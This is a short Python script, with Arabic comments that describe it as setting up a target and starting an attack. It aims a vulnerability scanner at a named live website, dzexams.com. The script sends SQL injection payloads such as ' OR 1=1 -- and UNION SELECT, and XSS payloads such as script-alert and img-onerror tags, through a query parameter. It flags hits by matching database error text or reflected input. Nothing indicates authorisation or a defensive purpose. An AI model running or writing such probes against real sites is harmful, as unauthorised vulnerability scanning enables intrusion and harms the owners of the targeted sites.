import requests

# إعداد الهدف وتهيئة الهجوم
url = "https://www.dzexams.com/"  # استبدل بعنوان الموقع الهدف
vulnerabilities = {
    "SQLi": ["'", "' OR 1=1 --", "' UNION SELECT null, null --"],
    "XSS": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
}

def test_sqli(target_url, payload):
    """اختبار SQL Injection"""
    response = requests.get(f"{target_url}?input={payload}")
    if "SQL syntax" in response.text or "mysql" in response.text:
        print(f"[+] Potential SQLi vulnerability found with payload: {payload}")
    else:
        print(f"[-] No SQLi vulnerability with payload: {payload}")

def test_xss(target_url, payload):
    """اختبار XSS"""
    response = requests.get(f"{target_url}?input={payload}")
    if payload in response.text:
        print(f"[+] Potential XSS vulnerability found with payload: {payload}")
    else:
        print(f"[-] No XSS vulnerability with payload: {payload}")

def scan(target_url):
    """تفحص الثغرات"""
    print("[*] Scanning for vulnerabilities...")
    for vuln, payloads in vulnerabilities.items():
        for payload in payloads:
            if vuln == "SQLi":
                test_sqli(target_url, payload)
            elif vuln == "XSS":
                test_xss(target_url, payload)

if __name__ == "__main__":
    scan(url)
